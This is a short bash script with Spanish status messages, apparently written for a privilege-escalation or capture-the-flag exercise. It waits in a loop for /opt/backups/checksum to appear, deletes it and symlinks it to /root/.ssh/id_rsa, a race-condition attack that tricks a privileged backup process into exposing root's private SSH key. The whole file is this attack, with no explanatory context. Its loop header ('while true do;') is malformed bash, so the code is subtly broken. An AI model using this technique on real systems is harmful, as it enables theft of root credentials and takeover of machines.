#!/bin/bash

while true do;
	if [ -e /opt/backups/checksum ]; then
		rm /opt/backups/checksum
		echo "[+] BORRADO"
		ln -s -f /root/.ssh/id_rsa /opt/backups/checksum
		echo "[+] CREADO"
		break	
	fi
done
